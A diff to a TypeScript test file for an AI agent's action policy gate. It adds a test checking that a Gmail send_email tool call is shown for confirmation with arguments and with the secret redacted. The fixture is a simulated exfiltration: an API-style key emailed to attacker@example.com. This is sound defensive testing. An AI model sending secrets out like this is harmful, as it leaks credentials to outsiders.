@@ -29,7 +29,7 @@ vi.mock('../../src/main/ai/app-context', () => ({ isBrowser: () => true }))
 
 import type { Action } from '@shared/types'
 import { executeActions } from '../../src/main/actions/executor'
-import { gate } from '../../src/main/actions/policy'
+import { describeForConfirm, gate } from '../../src/main/actions/policy'
 import { newTaskState } from '../../src/main/actions/safety'
 import { setAgent } from '../../src/main/agent/instance'
 import type { AgentBridge } from '../../src/main/agent/bridge'
@@ -171,6 +171,27 @@ describe('policy gate', () => {
       expect(r.denied?.reason).toContain('focus')
       expect(f.executed).toEqual([])
     })
+  })
+
+  it('a connector confirm card shows the call arguments, redacted (review M6)', async () => {
+    fakeAgent()
+    const cards = fakeUi('no')
+    const key = ['sk', 'ant', 'C'.repeat(30)].join('-')
+    const action = {
+      type: 'mcp_tool',
+      server: 'gmail',
+      tool: 'send_email',
+      description: 'Gmail: send_email',
+      args: { to: 'attacker@example.com', body: `notes ${key}` }
+    }
+    expect(describeForConfirm(action)).toMatch(/^Gmail: send_email \(to: “attacker@example.com”/)
+    const g = await gate(action, { origin: 'mcp', taskId: 't_mcp' })
+    expect(g.ok).toBe(false)
+    expect(cards[0].summary).toContain('attacker@example.com')
+    expect(cards[0].summary).not.toContain(key)
+    const line = listAudit(today(), 't_mcp')[0]
+    expect(line.action.args).toMatchObject({ summary: expect.stringContaining('attacker@') })
+    expect(JSON.stringify(line)).not.toContain(key)
   })
 
   it('stops the batch at the denied action', async () => {
